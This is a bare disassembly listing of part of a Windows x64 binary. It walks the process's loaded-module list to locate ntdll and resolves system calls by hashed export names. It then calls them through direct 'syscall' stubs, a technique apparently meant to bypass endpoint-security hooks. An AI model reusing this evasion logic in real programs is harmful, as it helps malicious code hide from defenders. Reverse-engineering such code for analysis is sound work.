   140002d87:	74 9a                	je     0x140002d23
   140002d89:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002d8e:	31 d2                	xor    %edx,%edx
   140002d90:	e8 34 03 00 00       	call   0x1400030c9
   140002d95:	48 89 d8             	mov    %rbx,%rax
   140002d98:	48 83 c4 60          	add    $0x60,%rsp
   140002d9c:	5b                   	pop    %rbx
   140002d9d:	5e                   	pop    %rsi
   140002d9e:	5f                   	pop    %rdi
   140002d9f:	5d                   	pop    %rbp
   140002da0:	41 5c                	pop    %r12
   140002da2:	c3                   	ret
   140002da3:	90                   	nop
   140002da4:	90                   	nop
   140002da5:	90                   	nop
   140002da6:	90                   	nop
   140002da7:	90                   	nop
   140002da8:	90                   	nop
   140002da9:	90                   	nop
   140002daa:	90                   	nop
   140002dab:	90                   	nop
   140002dac:	90                   	nop
   140002dad:	90                   	nop
   140002dae:	90                   	nop
   140002daf:	90                   	nop
   140002db0:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140002db7:	00 00 
   140002db9:	c3                   	ret
   140002dba:	0f 0b                	ud2
   140002dbc:	41 57                	push   %r15
   140002dbe:	41 56                	push   %r14
   140002dc0:	41 55                	push   %r13
   140002dc2:	41 54                	push   %r12
   140002dc4:	55                   	push   %rbp
   140002dc5:	57                   	push   %rdi
   140002dc6:	56                   	push   %rsi
   140002dc7:	53                   	push   %rbx
   140002dc8:	48 83 ec 48          	sub    $0x48,%rsp
   140002dcc:	83 3d 2d 31 57 00 00 	cmpl   $0x0,0x57312d(%rip)        # 0x140575f00
   140002dd3:	0f 85 d1 01 00 00    	jne    0x140002faa
   140002dd9:	c7 44 24 24 01 56 75 	movl   $0xd9755601,0x24(%rsp)
   140002de0:	d9 
   140002de1:	c7 44 24 28 ff 0f 75 	movl   $0xd9750fff,0x28(%rsp)
   140002de8:	d9 
   140002de9:	c7 44 24 2c ed 58 11 	movl   $0x6d1158ed,0x2c(%rsp)
   140002df0:	6d 
   140002df1:	c7 44 24 30 cf e1 10 	movl   $0x6d10e1cf,0x30(%rsp)
   140002df8:	6d 
   140002df9:	c7 44 24 34 af e1 10 	movl   $0x6d10e1af,0x34(%rsp)
   140002e00:	6d 
   140002e01:	c7 44 24 38 b3 e1 10 	movl   $0x6d10e1b3,0x38(%rsp)
   140002e08:	6d 
   140002e09:	c7 44 24 3c b7 e1 10 	movl   $0x6d10e1b7,0x3c(%rsp)
   140002e10:	6d 
   140002e11:	e8 9a ff ff ff       	call   0x140002db0
   140002e16:	31 c9                	xor    %ecx,%ecx
   140002e18:	31 d2                	xor    %edx,%edx
   140002e1a:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002e1e:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140002e22:	49 8b 40 30          	mov    0x30(%r8),%rax
   140002e26:	48 85 c0             	test   %rax,%rax
   140002e29:	74 61                	je     0x140002e8c
   140002e2b:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140002e2f:	81 e9 93 e1 10 6d    	sub    $0x6d10e193,%ecx
   140002e35:	8b 0c 01             	mov    (%rcx,%rax,1),%ecx
   140002e38:	8b 8c 08 88 00 00 00 	mov    0x88(%rax,%rcx,1),%ecx
   140002e3f:	85 c9                	test   %ecx,%ecx
   140002e41:	74 41                	je     0x140002e84
   140002e43:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   140002e47:	44 8b 4c 24 24       	mov    0x24(%rsp),%r9d
   140002e4c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140002e4f:	41 81 e9 93 e1 10 6d 	sub    $0x6d10e193,%r9d
   140002e56:	48 01 c1             	add    %rax,%rcx
   140002e59:	44 8b 11             	mov    (%rcx),%r10d
   140002e5c:	41 81 ca 20 20 20 20 	or     $0x20202020,%r10d
   140002e63:	45 39 ca             	cmp    %r9d,%r10d
   140002e66:	75 1c                	jne    0x140002e84
   140002e68:	44 8b 51 04          	mov    0x4(%rcx),%r10d
   140002e6c:	44 8b 4c 24 28       	mov    0x28(%rsp),%r9d
   140002e71:	41 81 ca 20 20 20 20 	or     $0x20202020,%r10d
   140002e78:	41 8d 89 6d 1e ef 92 	lea    -0x6d10e193(%r9),%ecx
   140002e7f:	41 39 ca             	cmp    %ecx,%r10d
   140002e82:	74 0b                	je     0x140002e8f
   140002e84:	4d 8b 00             	mov    (%r8),%r8
   140002e87:	48 89 c1             	mov    %rax,%rcx
   140002e8a:	eb 96                	jmp    0x140002e22
   140002e8c:	48 89 c8             	mov    %rcx,%rax
   140002e8f:	31 c9                	xor    %ecx,%ecx
   140002e91:	48 85 d2             	test   %rdx,%rdx
   140002e94:	0f 84 15 01 00 00    	je     0x140002faf
   140002e9a:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140002e9e:	8b 7a 18             	mov    0x18(%rdx),%edi
   140002ea1:	45 31 c9             	xor    %r9d,%r9d
   140002ea4:	45 31 c0             	xor    %r8d,%r8d
   140002ea7:	48 8d 35 56 30 57 00 	lea    0x573056(%rip),%rsi        # 0x140575f04
   140002eae:	81 e9 93 e1 10 6d    	sub    $0x6d10e193,%ecx
   140002eb4:	48 8d 6e fc          	lea    -0x4(%rsi),%rbp
   140002eb8:	44 8b 14 11          	mov    (%rcx,%rdx,1),%r10d
   140002ebc:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   140002ec0:	81 e9 93 e1 10 6d    	sub    $0x6d10e193,%ecx
   140002ec6:	49 01 c2             	add    %rax,%r10
   140002ec9:	44 8b 1c 11          	mov    (%rcx,%rdx,1),%r11d
   140002ecd:	8b 4c 24 3c          	mov    0x3c(%rsp),%ecx
   140002ed1:	81 e9 93 e1 10 6d    	sub    $0x6d10e193,%ecx
   140002ed7:	49 01 c3             	add    %rax,%r11
   140002eda:	8b 1c 11             	mov    (%rcx,%rdx,1),%ebx
   140002edd:	48 01 c3             	add    %rax,%rbx
   140002ee0:	41 39 f9             	cmp    %edi,%r9d
   140002ee3:	0f 83 ba 00 00 00    	jae    0x140002fa3
   140002ee9:	41 81 f8 f3 01 00 00 	cmp    $0x1f3,%r8d
   140002ef0:	0f 87 ad 00 00 00    	ja     0x140002fa3
   140002ef6:	45 89 cd             	mov    %r9d,%r13d
   140002ef9:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   140002efd:	43 8b 14 ab          	mov    (%r11,%r13,4),%edx
   140002f01:	81 e9 93 e1 10 6d    	sub    $0x6d10e193,%ecx
   140002f07:	48 01 c2             	add    %rax,%rdx
   140002f0a:	44 0f b7 22          	movzwl (%rdx),%r12d
   140002f0e:	41 39 cc             	cmp    %ecx,%r12d
   140002f11:	0f 85 84 00 00 00    	jne    0x140002f9b
   140002f17:	45 31 e4             	xor    %r12d,%r12d
   140002f1a:	b9 6d 1e ef 92       	mov    $0x92ef1e6d,%ecx
   140002f1f:	45 89 e7             	mov    %r12d,%r15d
   140002f22:	42 80 3c 3a 00       	cmpb   $0x0,(%rdx,%r15,1)
   140002f27:	74 17                	je     0x140002f40
   140002f29:	41 89 ce             	mov    %ecx,%r14d
   140002f2c:	41 ff c4             	inc    %r12d
   140002f2f:	41 c1 ce 08          	ror    $0x8,%r14d
   140002f33:	41 01 ce             	add    %ecx,%r14d
   140002f36:	42 0f b7 0c 3a       	movzwl (%rdx,%r15,1),%ecx
   140002f3b:	44 01 f1             	add    %r14d,%ecx
   140002f3e:	eb df                	jmp    0x140002f1f
   140002f40:	44 89 c2             	mov    %r8d,%edx
   140002f43:	48 c1 e2 03          	shl    $0x3,%rdx
   140002f47:	4c 8d 24 32          	lea    (%rdx,%rsi,1),%r12
   140002f4b:	48 01 ea             	add    %rbp,%rdx
   140002f4e:	41 89 0c 24          	mov    %ecx,(%r12)
   140002f52:	42 0f b7 0c 6b       	movzwl (%rbx,%r13,2),%ecx
   140002f57:	41 8b 0c 8a          	mov    (%r10,%rcx,4),%ecx
   140002f5b:	41 89 4c 24 04       	mov    %ecx,0x4(%r12)
   140002f60:	45 89 c4             	mov    %r8d,%r12d
   140002f63:	45 85 e4             	test   %r12d,%r12d
   140002f66:	75 05                	jne    0x140002f6d
   140002f68:	41 ff c0             	inc    %r8d
   140002f6b:	eb 2e                	jmp    0x140002f9b
   140002f6d:	41 8d 4c 24 ff       	lea    -0x1(%r12),%ecx
   140002f72:	44 8b 6a 08          	mov    0x8(%rdx),%r13d
   140002f76:	48 83 ea 08          	sub    $0x8,%rdx
   140002f7a:	49 89 cc             	mov    %rcx,%r12
   140002f7d:	48 8d 0c ce          	lea    (%rsi,%rcx,8),%rcx
   140002f81:	44 3b 69 04          	cmp    0x4(%rcx),%r13d
   140002f85:	73 e1                	jae    0x140002f68
   140002f87:	44 8b 72 0c          	mov    0xc(%rdx),%r14d
   140002f8b:	4c 8b 39             	mov    (%rcx),%r15
   140002f8e:	4c 89 7a 0c          	mov    %r15,0xc(%rdx)
   140002f92:	44 89 31             	mov    %r14d,(%rcx)
   140002f95:	44 89 69 04          	mov    %r13d,0x4(%rcx)
   140002f99:	eb c8                	jmp    0x140002f63
   140002f9b:	41 ff c1             	inc    %r9d
   140002f9e:	e9 3d ff ff ff       	jmp    0x140002ee0
   140002fa3:	44 89 05 56 2f 57 00 	mov    %r8d,0x572f56(%rip)        # 0x140575f00
   140002faa:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002faf:	89 c8                	mov    %ecx,%eax
   140002fb1:	48 83 c4 48          	add    $0x48,%rsp
   140002fb5:	5b                   	pop    %rbx
   140002fb6:	5e                   	pop    %rsi
   140002fb7:	5f                   	pop    %rdi
   140002fb8:	5d                   	pop    %rbp
   140002fb9:	41 5c                	pop    %r12
   140002fbb:	41 5d                	pop    %r13
   140002fbd:	41 5e                	pop    %r14
   140002fbf:	41 5f                	pop    %r15
   140002fc1:	c3                   	ret
   140002fc2:	53                   	push   %rbx
   140002fc3:	48 83 ec 20          	sub    $0x20,%rsp
   140002fc7:	89 cb                	mov    %ecx,%ebx
   140002fc9:	e8 ee fd ff ff       	call   0x140002dbc
   140002fce:	83 ca ff             	or     $0xffffffff,%edx
   140002fd1:	85 c0                	test   %eax,%eax
   140002fd3:	74 23                	je     0x140002ff8
   140002fd5:	8b 0d 25 2f 57 00    	mov    0x572f25(%rip),%ecx        # 0x140575f00
   140002fdb:	31 c0                	xor    %eax,%eax
   140002fdd:	4c 8d 05 18 2f 57 00 	lea    0x572f18(%rip),%r8        # 0x140575efc
   140002fe4:	89 c2                	mov    %eax,%edx
   140002fe6:	39 c8                	cmp    %ecx,%eax
   140002fe8:	73 0b                	jae    0x140002ff5
   140002fea:	48 ff c0             	inc    %rax
   140002fed:	41 39 1c c0          	cmp    %ebx,(%r8,%rax,8)
   140002ff1:	75 f1                	jne    0x140002fe4
   140002ff3:	eb 03                	jmp    0x140002ff8
   140002ff5:	83 ca ff             	or     $0xffffffff,%edx
   140002ff8:	89 d0                	mov    %edx,%eax
   140002ffa:	48 83 c4 20          	add    $0x20,%rsp
   140002ffe:	5b                   	pop    %rbx
   140002fff:	c3                   	ret
   140003000:	58                   	pop    %rax
   140003001:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003006:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000300b:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003010:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003015:	48 83 ec 28          	sub    $0x28,%rsp
   140003019:	4c 89 d1             	mov    %r10,%rcx
   14000301c:	e8 a1 ff ff ff       	call   0x140002fc2
   140003021:	48 83 c4 28          	add    $0x28,%rsp
   140003025:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   14000302a:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   14000302f:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   140003034:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140003039:	49 89 ca             	mov    %rcx,%r10
   14000303c:	0f 05                	syscall
   14000303e:	c3                   	ret
   14000303f:	49 ba 03 e7 e7 9f 00 	movabs $0x9fe7e703,%r10
   140003046:	00 00 00 
   140003049:	e8 b2 ff ff ff       	call   0x140003000
   14000304e:	49 ba 4e 04 bd 95 00 	movabs $0x95bd044e,%r10
   140003055:	00 00 00 
   140003058:	e8 a3 ff ff ff       	call   0x140003000
   14000305d:	49 c7 c2 84 d2 b7 05 	mov    $0x5b7d284,%r10
   140003064:	e8 97 ff ff ff       	call   0x140003000
   140003069:	49 ba 63 c1 a2 e0 00 	movabs $0xe0a2c163,%r10
   140003070:	00 00 00 
   140003073:	e8 88 ff ff ff       	call   0x140003000
   140003078:	49 c7 c2 af e9 d0 32 	mov    $0x32d0e9af,%r10
   14000307f:	e8 7c ff ff ff       	call   0x140003000
   140003084:	49 c7 c2 f3 f0 7e 1d 	mov    $0x1d7ef0f3,%r10
   14000308b:	e8 70 ff ff ff       	call   0x140003000
   140003090:	49 c7 c2 ef 1d 01 66 	mov    $0x66011def,%r10
   140003097:	e8 64 ff ff ff       	call   0x140003000
   14000309c:	49 ba a3 2d 89 9b 00 	movabs $0x9b892da3,%r10
   1400030a3:	00 00 00 
   1400030a6:	e8 55 ff ff ff       	call   0x140003000
   1400030ab:	49 ba b8 e9 33 95 00 	movabs $0x9533e9b8,%r10
   1400030b2:	00 00 00 
   1400030b5:	e8 46 ff ff ff       	call   0x140003000
   1400030ba:	49 ba 00 da 10 d3 00 	movabs $0xd310da00,%r10
   1400030c1:	00 00 00 
   1400030c4:	e8 37 ff ff ff       	call   0x140003000
   1400030c9:	49 ba 00 a5 ce c7 00 	movabs $0xc7cea500,%r10
   1400030d0:	00 00 00 
   1400030d3:	e8 28 ff ff ff       	call   0x140003000
   1400030d8:	49 c7 c2 1b 1e cd 67 	mov    $0x67cd1e1b,%r10
   1400030df:	e8 1c ff ff ff       	call   0x140003000
   1400030e4:	49 ba b9 ad 56 ff 00 	movabs $0xff56adb9,%r10
   1400030eb:	00 00 00 
   1400030ee:	e8 0d ff ff ff       	call   0x140003000
   1400030f3:	49 c7 c2 72 20 50 2a 	mov    $0x2a502072,%r10
   1400030fa:	e8 01 ff ff ff       	call   0x140003000
   1400030ff:	49 c7 c2 0a 17 8e 09 	mov    $0x98e170a,%r10
   140003106:	e8 f5 fe ff ff       	call   0x140003000
   14000310b:	49 c7 c2 86 c1 25 72 	mov    $0x7225c186,%r10
   140003112:	e8 e9 fe ff ff       	call   0x140003000
   140003117:	49 ba a7 d0 52 bd 00 	movabs $0xbd52d0a7,%r10
   14000311e:	00 00 00 
   140003121:	e8 da fe ff ff       	call   0x140003000
   140003126:	49 ba d3 09 6d c5 00 	movabs $0xc56d09d3,%r10
   14000312d:	00 00 00 
   140003130:	e8 cb fe ff ff       	call   0x140003000
   140003135:	49 ba 09 d6 cb 8d 00 	movabs $0x8dcbd609,%r10
   14000313c:	00 00 00 
   14000313f:	e8 bc fe ff ff       	call   0x140003000
   140003144:	49 ba b3 9b f2 9d 00 	movabs $0x9df29bb3,%r10
   14000314b:	00 00 00 
   14000314e:	e8 ad fe ff ff       	call   0x140003000
   140003153:	49 ba be 64 0e f5 00 	movabs $0xf50e64be,%r10
   14000315a:	00 00 00 
   14000315d:	e8 9e fe ff ff       	call   0x140003000
   140003162:	49 c7 c2 7b 08 f4 02 	mov    $0x2f4087b,%r10
   140003169:	e8 92 fe ff ff       	call   0x140003000
   14000316e:	49 c7 c2 71 5e 67 16 	mov    $0x16675e71,%r10
   140003175:	e8 86 fe ff ff       	call   0x140003000
   14000317a:	49 c7 c2 09 6f 0b 33 	mov    $0x330b6f09,%r10
   140003181:	e8 7a fe ff ff       	call   0x140003000
   140003186:	49 ba db c0 14 c3 00 	movabs $0xc314c0db,%r10
   14000318d:	00 00 00 
   140003190:	e8 6b fe ff ff       	call   0x140003000
   140003195:	49 ba 21 2f 16 9c 00 	movabs $0x9c162f21,%r10
   14000319c:	00 00 00 
   14000319f:	e8 5c fe ff ff       	call   0x140003000
   1400031a4:	49 c7 c2 35 d2 86 7d 	mov    $0x7d86d235,%r10
   1400031ab:	e8 50 fe ff ff       	call   0x140003000
   1400031b0:	49 ba 2f 37 55 d6 00 	movabs $0xd655372f,%r10
   1400031b7:	00 00 00 
   1400031ba:	e8 41 fe ff ff       	call   0x140003000
   1400031bf:	49 ba e1 99 12 e2 00 	movabs $0xe21299e1,%r10
   1400031c6:	00 00 00 
   1400031c9:	e8 32 fe ff ff       	call   0x140003000
   1400031ce:	49 ba cf 24 5e 90 00 	movabs $0x905e24cf,%r10
   1400031d5:	00 00 00 
   1400031d8:	e8 23 fe ff ff       	call   0x140003000
   1400031dd:	49 c7 c2 32 17 60 03 	mov    $0x3601732,%r10
   1400031e4:	e8 17 fe ff ff       	call   0x140003000
   1400031e9:	90                   	nop
   1400031ea:	90                   	nop
   1400031eb:	90                   	nop
   1400031ec:	90                   	nop
   1400031ed:	90                   	nop
   1400031ee:	90                   	nop
   1400031ef:	90                   	nop
   1400031f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400031f4:	48 8b 05 c5 3c 57 00 	mov    0x573cc5(%rip),%rax        # 0x140576ec0
   1400031fb:	48 8b 00             	mov    (%rax),%rax
   1400031fe:	48 85 c0             	test   %rax,%rax
   140003201:	74 0c                	je     0x14000320f
   140003203:	ff d0                	call   *%rax
   140003205:	48 83 05 b3 3c 57 00 	addq   $0x8,0x573cb3(%rip)        # 0x140576ec0
   14000320c:	08 
   14000320d:	eb e5                	jmp    0x1400031f4
   14000320f:	48 83 c4 28          	add    $0x28,%rsp
   140003213:	c3                   	ret
   140003214:	56                   	push   %rsi
   140003215:	53                   	push   %rbx
   140003216:	48 83 ec 28          	sub    $0x28,%rsp
   14000321a:	48 8b 1d 4f 51 57 00 	mov    0x57514f(%rip),%rbx        # 0x140578370
   140003221:	48 8b 13             	mov    (%rbx),%rdx
   140003224:	89 d0                	mov    %edx,%eax
   140003226:	ff c2                	inc    %edx
   140003228:	75 11                	jne    0x14000323b
   14000322a:	31 d2                	xor    %edx,%edx
   14000322c:	8d 4a 01             	lea    0x1(%rdx),%ecx
   14000322f:	89 d0                	mov    %edx,%eax
   140003231:	48 83 3c cb 00       	cmpq   $0x0,(%rbx,%rcx,8)
   140003236:	48 89 ca             	mov    %rcx,%rdx
   140003239:	75 f1                	jne    0x14000322c
   14000323b:	48 8d 34 c3          	lea    (%rbx,%rax,8),%rsi
   14000323f:	48 39 de             	cmp    %rbx,%rsi
   140003242:	74 08                	je     0x14000324c
   140003244:	ff 16                	call   *(%rsi)
   140003246:	48 83 ee 08          	sub    $0x8,%rsi
   14000324a:	eb f3                	jmp    0x14000323f
   14000324c:	48 8d 0d 9d ff ff ff 	lea    -0x63(%rip),%rcx        # 0x1400031f0
   140003253:	48 83 c4 28          	add    $0x28,%rsp
   140003257:	5b                   	pop    %rbx
   140003258:	5e                   	pop    %rsi
   140003259:	e9 d7 e0 ff ff       	jmp    0x140001335
   14000325e:	83 3d 5b 91 57 00 00 	cmpl   $0x0,0x57915b(%rip)        # 0x14057c3c0
   140003265:	75 0c                	jne    0x140003273
   140003267:	c7 05 4f 91 57 00 01 	movl   $0x1,0x57914f(%rip)        # 0x14057c3c0
   14000326e:	00 00 00 
   140003271:	eb a1                	jmp    0x140003214
   140003273:	c3                   	ret
   140003274:	90                   	nop
   140003275:	90                   	nop
   140003276:	90                   	nop
   140003277:	90                   	nop
   140003278:	90                   	nop
   140003279:	90                   	nop
   14000327a:	90                   	nop
   14000327b:	90                   	nop
   14000327c:	90                   	nop
   14000327d:	90                   	nop
   14000327e:	90                   	nop
   14000327f:	90                   	nop
   140003280:	31 c0                	xor    %eax,%eax
   140003282:	c3                   	ret
   140003283:	90                   	nop
   140003284:	90                   	nop
   140003285:	90                   	nop
   140003286:	90                   	nop
   140003287:	90                   	nop
   140003288:	90                   	nop
   140003289:	90                   	nop
   14000328a:	90                   	nop
   14000328b:	90                   	nop
   14000328c:	90                   	nop
   14000328d:	90                   	nop
   14000328e:	90                   	nop
   14000328f:	90                   	nop
   140003290:	48 83 ec 28          	sub    $0x28,%rsp
   140003294:	83 fa 03             	cmp    $0x3,%edx
   140003297:	74 04                	je     0x14000329d
   140003299:	85 d2                	test   %edx,%edx
   14000329b:	75 05                	jne    0x1400032a2
   14000329d:	e8 5b 08 00 00       	call   0x140003afd
   1400032a2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400032a7:	48 83 c4 28          	add    $0x28,%rsp
   1400032ab:	c3                   	ret
   1400032ac:	56                   	push   %rsi
   1400032ad:	53                   	push   %rbx
   1400032ae:	48 83 ec 28          	sub    $0x28,%rsp
   1400032b2:	48 8b 05 97 50 57 00 	mov    0x575097(%rip),%rax        # 0x140578350
   1400032b9:	83 38 02             	cmpl   $0x2,(%rax)
   1400032bc:	74 06                	je     0x1400032c4
   1400032be:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   1400032c4:	83 fa 02             	cmp    $0x2,%edx
   1400032c7:	74 0c                	je     0x1400032d5
   1400032c9:	83 fa 01             	cmp    $0x1,%edx
   1400032cc:	75 2a                	jne    0x1400032f8
   1400032ce:	e8 2a 08 00 00       	call   0x140003afd
   1400032d3:	eb 23                	jmp    0x1400032f8
   1400032d5:	48 8d 1d 7c ad 57 00 	lea    0x57ad7c(%rip),%rbx        # 0x14057e058
   1400032dc:	48 8d 35 75 ad 57 00 	lea    0x57ad75(%rip),%rsi        # 0x14057e058
   1400032e3:	48 39 f3             	cmp    %rsi,%rbx
   1400032e6:	74 10                	je     0x1400032f8
   1400032e8:	48 8b 03             	mov    (%rbx),%rax
   1400032eb:	48 85 c0             	test   %rax,%rax
   1400032ee:	74 02                	je     0x1400032f2
   1400032f0:	ff d0                	call   *%rax
   1400032f2:	48 83 c3 08          	add    $0x8,%rbx
   1400032f6:	eb eb                	jmp    0x1400032e3
   1400032f8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400032fd:	48 83 c4 28          	add    $0x28,%rsp
   140003301:	5b                   	pop    %rbx
   140003302:	5e                   	pop    %rsi
   140003303:	c3                   	ret
   140003304:	31 c0                	xor    %eax,%eax
   140003306:	c3                   	ret
   140003307:	90                   	nop
   140003308:	90                   	nop
   140003309:	90                   	nop
   14000330a:	90                   	nop
   14000330b:	90                   	nop
   14000330c:	90                   	nop
   14000330d:	90                   	nop
   14000330e:	90                   	nop
   14000330f:	90                   	nop
   140003310:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140003317:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   14000331c:	0f 29 7c 24 60       	movaps %xmm7,0x60(%rsp)
   140003321:	44 0f 29 44 24 70    	movaps %xmm8,0x70(%rsp)
   140003327:	4c 8d 05 4b 4e 57 00 	lea    0x574e4b(%rip),%r8        # 0x140578179
   14000332e:	8b 01                	mov    (%rcx),%eax
   140003330:	ff c8                	dec    %eax
   140003332:	83 f8 05             	cmp    $0x5,%eax
   140003335:	77 44                	ja     0x14000337b
   140003337:	48 8d 15 76 4e 57 00 	lea    0x574e76(%rip),%rdx        # 0x1405781b4
   14000333e:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140003342:	48 01 d0             	add    %rdx,%rax
   140003345:	ff e0                	jmp    *%rax
   140003347:	4c 8d 05 52 4d 57 00 	lea    0x574d52(%rip),%r8        # 0x1405780a0
   14000334e:	eb 2b                	jmp    0x14000337b
   140003350:	4c 8d 05 84 4d 57 00 	lea    0x574d84(%rip),%r8        # 0x1405780db
   140003357:	eb 22                	jmp    0x14000337b
   140003359:	4c 8d 05 9b 4d 57 00 	lea    0x574d9b(%rip),%r8        # 0x1405780fb
   140003360:	eb 19                	jmp    0x14000337b
   140003362:	4c 8d 05 b7 4d 57 00 	lea    0x574db7(%rip),%r8        # 0x140578120
   140003369:	eb 10                	jmp    0x14000337b
   14000336b:	4c 8d 05 d1 4d 57 00 	lea    0x574dd1(%rip),%r8        # 0x140578143
   140003372:	eb 07                	jmp    0x14000337b
   140003374:	4c 8d 05 44 4d 57 00 	lea    0x574d44(%rip),%r8        # 0x1405780bf
   14000337b:	4c 8b 49 08          	mov    0x8(%rcx),%r9
   14000337f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140003385:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   14000338a:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   14000338f:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   140003394:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003399:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   14000339e:	e8 ed 0a 00 00       	call   0x140003e90
   1400033a3:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400033a8:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   1400033ad:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   1400033b4:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   1400033ba:	48 89 c1             	mov    %rax,%rcx
   1400033bd:	48 8d 15 c3 4d 57 00 	lea    0x574dc3(%rip),%rdx        # 0x140578187
   1400033c4:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   1400033ca:	e8 41 0b 00 00       	call   0x140003f10
   1400033cf:	90                   	nop
   1400033d0:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   1400033d5:	0f 28 7c 24 60       	movaps 0x60(%rsp),%xmm7
   1400033da:	31 c0                	xor    %eax,%eax
   1400033dc:	44 0f 28 44 24 70    	movaps 0x70(%rsp),%xmm8
   1400033e2:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400033e9:	c3                   	ret
   1400033ea:	90                   	nop
   1400033eb:	90                   	nop
   1400033ec:	90                   	nop
   1400033ed:	90                   	nop
   1400033ee:	90                   	nop
   1400033ef:	90                   	nop
   1400033f0:	db e3                	fninit
   1400033f2:	c3                   	ret
   1400033f3:	90                   	nop
   1400033f4:	90                   	nop
   1400033f5:	90                   	nop
   1400033f6:	90                   	nop
   1400033f7:	90                   	nop
   1400033f8:	90                   	nop
   1400033f9:	90                   	nop
   1400033fa:	90                   	nop
   1400033fb:	90                   	nop
   1400033fc:	90                   	nop
   1400033fd:	90                   	nop
   1400033fe:	90                   	nop
   1400033ff:	90                   	nop
   140003400:	53                   	push   %rbx
   140003401:	48 83 ec 40          	sub    $0x40,%rsp
   140003405:	48 89 cb             	mov    %rcx,%rbx
   140003408:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000340d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003412:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140003417:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   14000341c:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140003421:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003426:	e8 65 0a 00 00       	call   0x140003e90
   14000342b:	48 8d 0d 9e 4d 57 00 	lea    0x574d9e(%rip),%rcx        # 0x1405781d0
   140003432:	48 89 c2             	mov    %rax,%rdx
   140003435:	e8 de 0a 00 00       	call   0x140003f18
   14000343a:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   14000343f:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003444:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140003449:	e8 42 0a 00 00       	call   0x140003e90
   14000344e:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140003453:	48 89 da             	mov    %rbx,%rdx
   140003456:	48 89 c1             	mov    %rax,%rcx
   140003459:	e8 ea 0a 00 00       	call   0x140003f48
   14000345e:	e8 95 0a 00 00       	call   0x140003ef8
   140003463:	90                   	nop
   140003464:	41 54                	push   %r12
   140003466:	55                   	push   %rbp
   140003467:	57                   	push   %rdi
   140003468:	56                   	push   %rsi
   140003469:	53                   	push   %rbx
   14000346a:	48 83 ec 50          	sub    $0x50,%rsp
   14000346e:	48 8b 05 c3 8f 57 00 	mov    0x578fc3(%rip),%rax        # 0x14057c438
   140003475:	31 db                	xor    %ebx,%ebx
   140003477:	48 83 c0 18          	add    $0x18,%rax
   14000347b:	49 89 cc             	mov    %rcx,%r12
   14000347e:	8b 0d b0 8f 57 00    	mov    0x578fb0(%rip),%ecx        # 0x14057c434
   140003484:	48 89 d6             	mov    %rdx,%rsi
   140003487:	4c 89 c7             	mov    %r8,%rdi
   14000348a:	39 cb                	cmp    %ecx,%ebx
   14000348c:	7d 24                	jge    0x1400034b2
   14000348e:	48 8b 10             	mov    (%rax),%rdx
   140003491:	49 39 d4             	cmp    %rdx,%r12
   140003494:	72 14                	jb     0x1400034aa
   140003496:	4c 8b 40 08          	mov    0x8(%rax),%r8
   14000349a:	45 8b 40 08          	mov    0x8(%r8),%r8d
   14000349e:	4c 01 c2             	add    %r8,%rdx
   1400034a1:	49 39 d4             	cmp    %rdx,%r12
   1400034a4:	0f 82 ef 00 00 00    	jb     0x140003599
   1400034aa:	ff c3                	inc    %ebx
   1400034ac:	48 83 c0 28          	add    $0x28,%rax
   1400034b0:	eb d8                	jmp    0x14000348a
   1400034b2:	4c 89 e1             	mov    %r12,%rcx
   1400034b5:	e8 d7 07 00 00       	call   0x140003c91
   1400034ba:	48 89 c5             	mov    %rax,%rbp
   1400034bd:	48 85 c0             	test   %rax,%rax
   1400034c0:	75 0f                	jne    0x1400034d1
   1400034c2:	4c 89 e2             	mov    %r12,%rdx
   1400034c5:	48 8d 0d 20 4d 57 00 	lea    0x574d20(%rip),%rcx        # 0x1405781ec
   1400034cc:	e8 2f ff ff ff       	call   0x140003400
   1400034d1:	48 63 db             	movslq %ebx,%rbx
